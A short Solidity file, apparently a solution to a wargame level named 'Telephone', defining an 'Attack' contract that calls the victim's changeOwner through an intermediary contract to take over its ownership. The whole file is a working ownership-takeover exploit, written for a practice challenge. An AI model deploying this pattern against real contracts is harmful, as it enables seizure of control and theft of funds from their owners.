
pragma solidity ^0.8.0;
import "./4_Telephone.sol";


contract Attack {
    address public owner;
    Telephone public victimContract;

    constructor(address _victimContract) {
        owner = msg.sender;
        victimContract = Telephone(_victimContract);
    }

    function attack(address _address) public {
        victimContract.changeOwner(_address);
    }

}
